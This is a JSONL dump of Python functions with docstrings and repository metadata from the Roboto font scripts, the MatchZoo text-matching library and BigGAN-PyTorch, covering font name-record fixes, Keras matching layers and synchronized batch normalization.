{"docstring": "\"\"\"Apply fixes needed for web and CrOS targets\"\"\"\n", "func_signal": "def apply_web_cros_common_fixes(font, unhinted, family_name):\n", "code": "subfamily_name = font_data.get_name_records(font)[2].encode('ASCII')\nassert(subfamily_name in\n    ['Thin', 'Thin Italic',\n     'Light', 'Light Italic',\n     'Regular', 'Italic',\n     'Medium', 'Medium Italic',\n     'Bold', 'Bold Italic',\n     'Black', 'Black Italic'])\n\nif 'Condensed' in font_data.get_name_records(font)[1]:\n    family_name += ' Condensed'\nfull_name = family_name\nif subfamily_name != 'Regular':\n    full_name += ' ' + subfamily_name\n\n# Family, subfamily names\nfont_data.set_name_record(font, 16, family_name)\nstyle_map = ['Regular', 'Bold', 'Italic', 'Bold Italic']\nif subfamily_name in style_map:\n    font_data.set_name_record(font, 1, family_name)\nelse:\n    weight = subfamily_name.split()[0]\n    new_family_name = family_name\n    if weight != 'Regular':\n        new_family_name += ' ' + weight\n    font_data.set_name_record(font, 1, new_family_name)\n\n    # all weights outside regular and bold should only have subfamily\n    # \"Regular\" or \"Italic\"\n    italic = subfamily_name.endswith('Italic')\n    font_data.set_name_record(font, 2, style_map[italic << 1])\n\n# Unique identifier and full name\nfont_data.set_name_record(font, 3, full_name)\nfont_data.set_name_record(font, 4, full_name)\nfont_data.set_name_record(font, 18, None)\n\n# PostScript name\nfont_data.set_name_record(\n    font, 6, (family_name+'-'+subfamily_name).replace(' ', ''))\n\n# Copyright message\nfont_data.set_name_record(\n    font, 0, 'Copyright 2011 Google Inc. All Rights Reserved.')\n\n# hotpatch glyphs by swapping\n# https://github.com/google/roboto/issues/18\nglyf = font['glyf']\nglyf['chi'], glyf['chi.alt'] = glyf['chi.alt'], glyf['chi']\n\n# make glyph orders consistent for feature copying\n# https://github.com/google/roboto/issues/71\nglyph_order = font.getGlyphOrder()\nfor i, glyph_name in enumerate(glyph_order):\n    if glyph_name.endswith('.lnum'):\n        new_name = glyph_name.replace('.lnum', '.pnum')\n        glyph_order[i] = new_name\n        font['glyf'][new_name] = font['glyf'][glyph_name]\n\n        # append old name to glyph order so del succeeds\n        glyph_order.append(glyph_name)\n        del font['glyf'][glyph_name]\n\n# copy features from unhinted\n# https://github.com/google/roboto/pull/163\nfor table in ['GDEF', 'GPOS', 'GSUB']:\n    font[table] = unhinted[table]", "path": "roboto/scripts/touchup_for_web.py", "commit_date": "2017-05-25 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Drop name records whose (PID,EID,Lang) != (3,1,0x409)\"\"\"\n", "func_signal": "def drop_non_windows_name_records(font):\n", "code": "names = font['name'].names\nrecords_to_drop = set()\nfor record_number, record in enumerate(names):\n    name_ids = (record.platformID, record.platEncID, record.langID)\n    if name_ids != (3, 1, 0x409):\n         records_to_drop.add(record_number)\n\n# Taken from nototools/font_data.py\nif records_to_drop:\n    font['name'].names = [\n        record for record_number, record in enumerate(names)\n        if record_number not in records_to_drop]", "path": "roboto/scripts/touchup_for_cros.py", "commit_date": "2016-06-02 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Check a sub rule with contextual replacement.\"\"\"\n", "func_signal": "def gsubType6(self, precedingContext, target, trailingContext, replacement):\n", "code": "refs = [precedingContext, target, trailingContext, replacement]\nif self._checkRefs(refs, self.subErr):\n    super(FilterFeatureWriter, self).gsubType6(\n        precedingContext, target, trailingContext, replacement)", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Compiles a feature-matching regex.\"\"\"\n\n# this is the pattern used internally by feaTools:\n# https://github.com/typesupply/feaTools/blob/master/Lib/feaTools/parser.py\n", "func_signal": "def compileFeatureRE(name):\n", "code": "featureRE = list(parser.featureContentRE)\nfeatureRE.insert(2, name)\nfeatureRE.insert(6, name)\nreturn re.compile(\"\".join(featureRE))", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Adds a language system instruction only once.\"\"\"\n", "func_signal": "def languageSystem(self, langTag, scriptTag):\n", "code": "system = (langTag, scriptTag)\nif system not in self.languageSystems:\n    self.languageSystems.add(system)\n    super(FilterFeatureWriter, self).languageSystem(langTag, scriptTag)", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Corrects metrics and other meta information.\"\"\"\n\n", "func_signal": "def correct_font(source_name, unhinted_name, target_font_name, family_name):\n", "code": "font = ttLib.TTFont(source_name)\nunhinted = ttLib.TTFont(unhinted_name)\n\n# apply web-specific fixes before shared, so that sub/family names are\n# correct for black weights and their bold bits will be set\napply_web_specific_fixes(font, unhinted, family_name)\ntemporary_touchups.apply_temporary_fixes(font, is_for_web=True)\ntemporary_touchups.update_version_and_revision(font)\nfont.save(target_font_name)", "path": "roboto/scripts/touchup_for_web.py", "commit_date": "2017-05-25 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Initializes the set of known references, empty by default.\"\"\"\n", "func_signal": "def __init__(self, refs=set(), name=None, isFeature=False):\n", "code": "self.refs = refs\nself.featureNames = set()\nself.lookupNames = set()\nself.tableNames = set()\nself.languageSystems = set()\nsuper(FilterFeatureWriter, self).__init__(\n    name=name, isFeature=isFeature)\n\n# error to print when undefined reference is found in glyph class\nself.classErr = ('Undefined reference \"%s\" removed from glyph class '\n    'definition %s.')\n\n# error to print when undefined reference is found in sub or pos rule\nsubErr = ['Substitution rule with undefined reference \"%s\" removed']\nif self._name:\n    subErr.append(\" from \")\n    subErr.append(\"feature\" if self._isFeature else \"lookup\")\n    subErr.append(' \"%s\"' % self._name)\nsubErr.append(\".\")\nself.subErr = \"\".join(subErr)\nself.posErr = self.subErr.replace(\"Substitution\", \"Positioning\")", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Apply fixes needed for web fonts.\"\"\"\n\n# set vertical metrics to old values\n", "func_signal": "def apply_web_specific_fixes(font, unhinted, family_name):\n", "code": "hhea = font['hhea']\nhhea.ascent = 1900\nhhea.descent = -500\n\nos2 = font['OS/2']\nos2.sTypoAscender = 1536\nos2.sTypoDescender = -512\nos2.sTypoLineGap = 102\nos2.usWinAscent = 1946\nos2.usWinDescent = 512\n\n# correct anything else needed for both web and Chrome OS\napply_web_cros_common_fixes(font, unhinted, family_name)", "path": "roboto/scripts/touchup_for_web.py", "commit_date": "2017-05-25 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Adds a lookup block only once.\"\"\"\n", "func_signal": "def lookup(self, name):\n", "code": "if name not in self.lookupNames:\n    self.lookupNames.add(name)\n    return super(FilterFeatureWriter, self).lookup(name)\n# we must return a new writer even if we don't add it to this one\nreturn FDKSyntaxFeatureWriter(name, False)", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Check a sub rule with many-to-one replacement.\"\"\"\n", "func_signal": "def gsubType4(self, target, replacement):\n", "code": "if self._checkRefs([target, replacement], self.subErr):\n    super(FilterFeatureWriter, self).gsubType4(target, replacement)", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Check a pair positioning rule.\"\"\"\n", "func_signal": "def gposType2(self, target, value, needEnum=False):\n", "code": "if self._checkRefs(target, self.posErr):\n    super(FilterFeatureWriter, self).gposType2(target, value, needEnum)", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Adds a table only once.\"\"\"\n", "func_signal": "def table(self, name, data):\n", "code": "if name in self.tableNames:\n    return\nself.tableNames.add(name)\nself._instructions.append(\"table %s {\" % name)\nself._instructions.extend([\"  %s %s;\" % line for line in data])\nself._instructions.append(\"} %s;\" % name)", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Adds a feature definition only once.\"\"\"\n", "func_signal": "def feature(self, name):\n", "code": "if name not in self.featureNames:\n    self.featureNames.add(name)\n    return super(FilterFeatureWriter, self).feature(name)\n# we must return a new writer even if we don't add it to this one\nreturn FDKSyntaxFeatureWriter(name, True)", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Check a sub rule with one-to-one replacement.\"\"\"\n", "func_signal": "def gsubType1(self, target, replacement):\n", "code": "if self._checkRefs([target, replacement], self.subErr):\n    super(FilterFeatureWriter, self).gsubType1(target, replacement)", "path": "roboto/scripts/lib/fontbuild/features.py", "commit_date": "2015-04-30 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "#print \"shortstyle:\", self.shortstyle\n", "func_signal": "def _getStyleCode(self):\n", "code": "styleCode = 0\nif self.shortstyle == \"Bold\":\n    styleCode = 32\nif self.shortstyle == \"Italic\":\n    styleCode = 1\nif self.shortstyle == \"Bold Italic\":\n    styleCode = 33\nif self.longstyle  == \"Regular\":\n    styleCode = 64\nreturn styleCode", "path": "roboto/scripts/lib/fontbuild/instanceNames.py", "commit_date": "2016-01-13 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Corrects metrics and other meta information.\"\"\"\n\n", "func_signal": "def correct_font(source_name, unhinted_name, target_font_name, family_name):\n", "code": "font = ttLib.TTFont(source_name)\nunhinted = ttLib.TTFont(unhinted_name)\n\napply_web_cros_common_fixes(font, unhinted, family_name)\ntemporary_touchups.apply_temporary_fixes(font, is_for_cros=True)\ntemporary_touchups.update_version_and_revision(font)\ndrop_non_windows_name_records(font)\nfont.save(target_font_name)", "path": "roboto/scripts/touchup_for_cros.py", "commit_date": "2016-06-02 00:00:00", "repo_name": "googlefonts/roboto", "stars": 3807, "license": "apache-2.0", "language": "python", "size": 113003}
{"docstring": "\"\"\"Calculate the layer output shape.\"\"\"\n", "func_signal": "def compute_output_shape(self, input_shapes):\n", "code": "if not isinstance(input_shapes, list):\n    raise ValueError('A attention layer should be called '\n                     'on a list of inputs.')\ninput_shape_lt, input_shape_rt = input_shapes[0], input_shapes[1]\nreturn input_shape_lt[0], input_shape_lt[1], input_shape_rt[1]", "path": "MatchZoo/matchzoo/contrib/layers/attention_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"Init.\"\"\"\n", "func_signal": "def __init__(self, mp_dim, **kwargs):\n", "code": "self.mp_dim = mp_dim\nsuper(MpCosineLayer, self).__init__(**kwargs)", "path": "MatchZoo/matchzoo/contrib/layers/multi_perspective_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"\nTransform two word index lists into a binary match list.\n\n:param input_: a dataframe include 'match' column and\n    'to_match' column.\n\n:return: a binary match result list of two word index lists.\n\"\"\"\n", "func_signal": "def transform(self, input_) -> list:\n", "code": "match_length = len(input_[self._match])\nmatch_binary = np.zeros((self._fixed_length_text))\nfor i in range(min(self._fixed_length_text, match_length)):\n    if input_[self._match][i] in set(input_[self._to_match]):\n        match_binary[i] = 1\n\nreturn match_binary.tolist()", "path": "MatchZoo/matchzoo/preprocessors/units/word_exact_match.py", "commit_date": "2019-06-05 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"Get the config dict of MatchingLayer.\"\"\"\n", "func_signal": "def get_config(self) -> dict:\n", "code": "config = {\n    'normalize': self._normalize,\n    'matching_type': self._matching_type,\n}\nbase_config = super(MatchingLayer, self).get_config()\nreturn dict(list(base_config.items()) + list(config.items()))", "path": "MatchZoo/matchzoo/layers/matching_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"Init.\"\"\"\n", "func_signal": "def __init__(self, mp_dim):\n", "code": "super(MpMaxPoolingMatch, self).__init__()\nself.mp_dim = mp_dim", "path": "MatchZoo/matchzoo/contrib/layers/multi_perspective_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"\nFix https://github.com/NTMC-Community/MatchZoo/issues/726.\n\nThis function changes how keras behaves, use with caution.\n\"\"\"\n", "func_signal": "def make_keras_optimizer_picklable():\n", "code": "def __getstate__(self):\n    return keras.optimizers.serialize(self)\n\ndef __setstate__(self, state):\n    optimizer = keras.optimizers.deserialize(state)\n    self.__dict__ = optimizer.__dict__\n\ncls = keras.optimizers.Optimizer\ncls.__getstate__ = __getstate__\ncls.__setstate__ = __setstate__", "path": "MatchZoo/matchzoo/utils/make_keras_optimizer_picklable.py", "commit_date": "2019-05-05 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"\nBuild the layer.\n\n:param input_shapes: input_shape_lt, input_shape_rt\n\"\"\"\n", "func_signal": "def build(self, input_shapes):\n", "code": "if not isinstance(input_shapes, list):\n    raise ValueError('A attention layer should be called '\n                     'on a list of inputs.')\n\nhidden_dim_lt = input_shapes[0][2]\nhidden_dim_rt = input_shapes[1][2]\n\nself.attn_w1 = self.add_weight(name='attn_w1',\n                               shape=(hidden_dim_lt,\n                                      self._att_dim),\n                               initializer='uniform',\n                               trainable=True)\nif hidden_dim_lt == hidden_dim_rt:\n    self.attn_w2 = self.attn_w1\nelse:\n    self.attn_w2 = self.add_weight(name='attn_w2',\n                                   shape=(hidden_dim_rt,\n                                          self._att_dim),\n                                   initializer='uniform',\n                                   trainable=True)\n# diagonal_W: (1, 1, a)\nself.diagonal_W = self.add_weight(name='diagonal_W',\n                                  shape=(1,\n                                         1,\n                                         self._att_dim),\n                                  initializer='uniform',\n                                  trainable=True)\nself.built = True", "path": "MatchZoo/matchzoo/contrib/layers/attention_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"\nCollect Probabilities.\n\nReference:\nhttps://github.com/zhiguowang/BiMPM/blob/master/src/layer_utils.py#L128-L140\n:param probs: [batch_size, chunks_size]\n:param positions: [batch_size, pair_size]\n:return: [batch_size, pair_size]\n\"\"\"\n", "func_signal": "def collect_probs(probs, positions):\n", "code": "batch_size = tf.shape(probs)[0]\npair_size = tf.shape(positions)[1]\n# shape (batch_size)\nbatch_nums = K.arange(0, batch_size)\n# [batch_size, 1]\nbatch_nums = tf.reshape(batch_nums, shape=[-1, 1])\n# [batch_size, pair_size]\nbatch_nums = K.tile(batch_nums, [1, pair_size])\n\n# shape (batch_size, pair_size, 2)\n# Alert: to solve error message\npositions = tf.cast(positions, tf.int32)\nindices = tf.stack([batch_nums, positions], axis=2)\n\npair_probs = tf.gather_nd(probs, indices)\n# pair_probs = tf.reshape(pair_probs, shape=[batch_size, pair_size])\nreturn pair_probs", "path": "MatchZoo/matchzoo/contrib/layers/multi_perspective_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"\nInsert `dpool_index` into `x`.\n\n:param x: unpacked x.\n:param y: unpacked y.\n\"\"\"\n", "func_signal": "def on_batch_unpacked(self, x, y):\n", "code": "x['dpool_index'] = _dynamic_pooling_index(\n    x['length_left'],\n    x['length_right'],\n    self._fixed_length_left,\n    self._fixed_length_right,\n    self._compress_ratio_left,\n    self._compress_ratio_right\n)", "path": "MatchZoo/matchzoo/data_generator/callbacks/dynamic_pooling.py", "commit_date": "2019-02-02 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"Build.\"\"\"\n", "func_signal": "def build(self, input_shape):\n", "code": "self.kernel = self.add_weight(name='kernel',\n                              shape=(1, 1, self.mp_dim,\n                                     input_shape[0][-1]),\n                              initializer='uniform',\n                              trainable=True)\nsuper(MpCosineLayer, self).build(input_shape)", "path": "MatchZoo/matchzoo/contrib/layers/multi_perspective_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"Build.\"\"\"\n", "func_signal": "def build(self, input_shapes):\n", "code": "d = input_shapes[0][-1]\nself.kernel = self.add_weight(name='kernel',\n                              shape=(1, 1, 1, self.mp_dim, d),\n                              initializer='uniform',\n                              trainable=True)\nself.built = True", "path": "MatchZoo/matchzoo/contrib/layers/multi_perspective_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"\nMask relevancy matrix.\n\n:param relevancy_matrix: [b, len_rt, len_lt]\n:param mask_lt: [b, len_lt]\n:param mask_rt: [b, len_rt]\n:return: masked_matrix: [b, len_rt, len_lt]\n\"\"\"\n", "func_signal": "def _mask_relevancy_matrix(relevancy_matrix, mask_lt, mask_rt):\n", "code": "if mask_lt is not None:\n    relevancy_matrix = relevancy_matrix * tf.expand_dims(mask_lt, 1)\nrelevancy_matrix = relevancy_matrix * tf.expand_dims(mask_rt, 2)\nreturn relevancy_matrix", "path": "MatchZoo/matchzoo/contrib/layers/multi_perspective_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"\nOnly requires `tf.reduce_sum(v1 * v2, axis=-1)`.\n\n:param v1: [batch, time_steps(v1), 1, m, d]\n:param v2: [batch, 1, time_steps(v2), m, d]\n:param cosine_norm: True\n:param eps: 1e-6\n:return: [batch, time_steps(v1), time_steps(v2), m]\n\"\"\"\n", "func_signal": "def _cosine_distance(v1, v2, cosine_norm=True, eps=1e-6):\n", "code": "cosine_numerator = tf.reduce_sum(v1 * v2, axis=-1)\nif not cosine_norm:\n    return K.tanh(cosine_numerator)\nv1_norm = K.sqrt(tf.maximum(tf.reduce_sum(tf.square(v1), axis=-1), eps))\nv2_norm = K.sqrt(tf.maximum(tf.reduce_sum(tf.square(v2), axis=-1), eps))\nreturn cosine_numerator / v1_norm / v2_norm", "path": "MatchZoo/matchzoo/contrib/layers/multi_perspective_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"Init.\"\"\"\n", "func_signal": "def __init__(self, mp_dim):\n", "code": "super(MpFullMatch, self).__init__()\nself.mp_dim = mp_dim", "path": "MatchZoo/matchzoo/contrib/layers/multi_perspective_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"\nBuild model structure.\n\naNMM model based on bin weighting and query term attentions\n\"\"\"\n# query is [batch_size, left_text_len]\n# doc is [batch_size, right_text_len, bin_num]\n", "func_signal": "def build(self):\n", "code": "query, doc = self._make_inputs()\nembedding = self._make_embedding_layer()\n\nq_embed = embedding(query)\nq_attention = keras.layers.Dense(\n    1, kernel_initializer=RandomUniform(), use_bias=False)(q_embed)\nq_text_len = self._params['input_shapes'][0][0]\n\nq_attention = keras.layers.Lambda(\n    lambda x: softmax(x, axis=1),\n    output_shape=(q_text_len,)\n)(q_attention)\nd_bin = keras.layers.Dropout(\n    rate=self._params['dropout_rate'])(doc)\nfor layer_id in range(self._params['num_layers'] - 1):\n    d_bin = keras.layers.Dense(\n        self._params['hidden_sizes'][layer_id],\n        kernel_initializer=RandomUniform())(d_bin)\n    d_bin = keras.layers.Activation('tanh')(d_bin)\nd_bin = keras.layers.Dense(\n    self._params['hidden_sizes'][self._params['num_layers'] - 1])(\n    d_bin)\nd_bin = keras.layers.Reshape((q_text_len,))(d_bin)\nq_attention = keras.layers.Reshape((q_text_len,))(q_attention)\nscore = keras.layers.Dot(axes=[1, 1])([d_bin, q_attention])\nx_out = self._make_output_layer()(score)\nself._backend = keras.Model(inputs=[query, doc], outputs=x_out)", "path": "MatchZoo/matchzoo/models/anmm.py", "commit_date": "2019-02-12 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\":return: model default parameters.\"\"\"\n", "func_signal": "def get_default_params(cls) -> ParamTable:\n", "code": "params = super().get_default_params(with_embedding=True)\nparams.add(Param(\n    name='dropout_rate', value=0.1,\n    desc=\"The dropout rate.\",\n    hyper_space=hyper_spaces.quniform(0, 1, 0.05)\n))\nparams.add(Param(\n    name='num_layers', value=2,\n    desc=\"Number of hidden layers in the MLP \"\n         \"layer.\"\n))\nparams.add(Param(\n    name='hidden_sizes', value=[30, 30],\n    desc=\"Number of hidden size for each hidden\"\n         \" layer\"\n))\nreturn params", "path": "MatchZoo/matchzoo/models/anmm.py", "commit_date": "2019-02-12 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"\nCollect final step of lstm.\n\n:param lstm_representation: [batch_size, len_rt, dim]\n:param lengths: [batch_size]\n:return: [batch_size, dim]\n\"\"\"\n", "func_signal": "def collect_final_step_of_lstm(lstm_representation, lengths):\n", "code": "lengths = tf.maximum(lengths, K.zeros_like(lengths))\n\nbatch_size = tf.shape(lengths)[0]\n# shape (batch_size)\nbatch_nums = tf.range(0, limit=batch_size)\n# shape (batch_size, 2)\nindices = tf.stack((batch_nums, lengths), axis=1)\nresult = tf.gather_nd(lstm_representation, indices,\n                        name='last-forwar-lstm')\n# [batch_size, dim]\nreturn result", "path": "MatchZoo/matchzoo/contrib/layers/multi_perspective_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"Init.\"\"\"\n", "func_signal": "def __init__(self, att_dim, mp_dim):\n", "code": "super(MpAttentiveMatch, self).__init__()\nself.att_dim = att_dim\nself.mp_dim = mp_dim", "path": "MatchZoo/matchzoo/contrib/layers/multi_perspective_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"Init.\"\"\"\n", "func_signal": "def __init__(self, mp_dim):\n", "code": "super(MpMaxAttentiveMatch, self).__init__()\nself.mp_dim = mp_dim", "path": "MatchZoo/matchzoo/contrib/layers/multi_perspective_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "\"\"\"\nCalculate max_question_representation.\n\n:param reps_lt: [batch_size, passage_len, hidden_size]\n:param attn_scores: []\n:return: [batch_size, passage_len, hidden_size].\n\"\"\"\n", "func_signal": "def cal_max_question_representation(reps_lt, attn_scores):\n", "code": "attn_positions = tf.argmax(attn_scores, axis=2)\nmax_reps_lt = collect_representation(reps_lt, attn_positions)\nreturn max_reps_lt", "path": "MatchZoo/matchzoo/contrib/layers/multi_perspective_layer.py", "commit_date": "2019-10-04 00:00:00", "repo_name": "NTMC-Community/MatchZoo", "stars": 3810, "license": "apache-2.0", "language": "python", "size": 42076}
{"docstring": "# parse command line and run    \n", "func_signal": "def main():\n", "code": "parser = prepare_parser()\nconfig = vars(parser.parse_args())\nprint(config)\nrun(config)", "path": "BigGAN-PyTorch/make_hdf5.py", "commit_date": "2019-03-30 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "\"\"\"\nArgs:\n    index (int): Index\n\nReturns:\n    tuple: (image, target) where target is class_index of the target class.\n\"\"\"\n", "func_signal": "def __getitem__(self, index):\n", "code": "if self.load_in_mem:\n    img = self.data[index]\n    target = self.labels[index]\nelse:\n  path, target = self.imgs[index]\n  img = self.loader(str(path))\n  if self.transform is not None:\n    img = self.transform(img)\n\nif self.target_transform is not None:\n  target = self.target_transform(target)\n\n# print(img.size(), target)\nreturn img, int(target)", "path": "BigGAN-PyTorch/datasets.py", "commit_date": "2019-07-10 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "\"\"\"\nMonkey-patch an existing `DataParallel` object. Add the replication callback.\nUseful when you have customized `DataParallel` implementation.\n\nExamples:\n    > sync_bn = SynchronizedBatchNorm1d(10, eps=1e-5, affine=False)\n    > sync_bn = DataParallel(sync_bn, device_ids=[0, 1])\n    > patch_replication_callback(sync_bn)\n    # this is equivalent to\n    > sync_bn = SynchronizedBatchNorm1d(10, eps=1e-5, affine=False)\n    > sync_bn = DataParallelWithCallback(sync_bn, device_ids=[0, 1])\n\"\"\"\n\n", "func_signal": "def patch_replication_callback(data_parallel):\n", "code": "assert isinstance(data_parallel, DataParallel)\n\nold_replicate = data_parallel.replicate\n\n@functools.wraps(old_replicate)\ndef new_replicate(module, device_ids):\n    modules = old_replicate(module, device_ids)\n    execute_replication_callbacks(modules)\n    return modules\n\ndata_parallel.replicate = new_replicate", "path": "BigGAN-PyTorch/sync_batchnorm/replicate.py", "commit_date": "2019-02-03 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "# open path as file to avoid ResourceWarning (https://github.com/python-pillow/Pillow/issues/835)\n", "func_signal": "def pil_loader(path):\n", "code": "\nimg = Image.open(f)\nreturn img.convert('RGB')", "path": "BigGAN-PyTorch/datasets.py", "commit_date": "2019-07-10 00:00:00", "repo_name": "ajbrock/BigGAN-PyTorch", "stars": 2792, "license": "mit", "language": "python", "size": 5727}
{"docstring": "# If it is not parallel computation or is in evaluation mode, use PyTorch's implementation.\n", "func_signal": "def forward(self, input, gain=None, bias=None):\n", "code": "if not (self._is_parallel and self.training):\n    out = F.batch_norm(\n        input, self.running_mean, self.running_var, self.weight, self.bias,\n        self.training, self.momentum, self.eps)\n    if gain is not None:\n      out = out + gain\n    if bias is not None:\n      out = out + bias\n    return out\n\n# Resize the input to (B, C, -1).\ninput_shape = input.size()\n# print(input_shape)\ninput = input.view(input.size(0), input.size(1), -1)\n\n# Compute the sum and square-sum.\nsum_size = input.size(0) * input.size(2)\ninput_sum = _sum_ft(input)\ninput_ssum = _sum_ft(input ** 2)\n# Reduce-and-broadcast the statistics.\n# print('it begins')\nif self._parallel_id == 0:\n    mean, inv_std = self._sync_master.run_master(_ChildMessage(input_sum, input_ssum, sum_size))\nelse:\n    mean, inv_std = self._slave_pipe.run_slave(_ChildMessage(input_sum, input_ssum, sum_size))\n# if self._parallel_id == 0:\n    # # print('here')\n    # sum, ssum, num = self._sync_master.run_master(_ChildMessage(input_sum, input_ssum, sum_size))\n# else:\n    # # print('there')\n    # sum, ssum, num = self._slave_pipe.run_slave(_ChildMessage(input_sum, input_ssum, sum_size))\n\n# print('how2')\n# num = sum_size\n# print('Sum: %f, ssum: %f, sumsize: %f, insum: %f' %(float(sum.sum().cpu()), float(ssum.sum().cpu()), float(sum_size), float(input_sum.sum().cpu()))) \n# Fix the graph\n# sum = (sum.detach() - input_sum.detach()) + input_sum\n# ssum = (ssum.detach() - input_ssum.detach()) + input_ssum\n\n# mean = sum / num\n# var = ssum / num - mean ** 2\n# # var = (ssum - mean * sum) / num\n# inv_std = torch.rsqrt(var + self.eps)\n\n# Compute the output.\nif gain is not None:\n  # print('gaining')\n  # scale = _unsqueeze_ft(inv_std) * gain.squeeze(-1)\n  # shift = _unsqueeze_ft(mean) * scale - bias.squeeze(-1)\n  # output = input * scale - shift\n  output = (input - _unsqueeze_ft(mean)) * (_unsqueeze_ft(inv_std) * gain.squeeze(-1)) + bias.squeeze(-1)\nelif self.affine:\n    # MJY:: Fuse the multiplication for speed.\n    output = (input - _unsqueeze_ft(mean)) * _unsqueeze_ft(inv_std * self.weight) 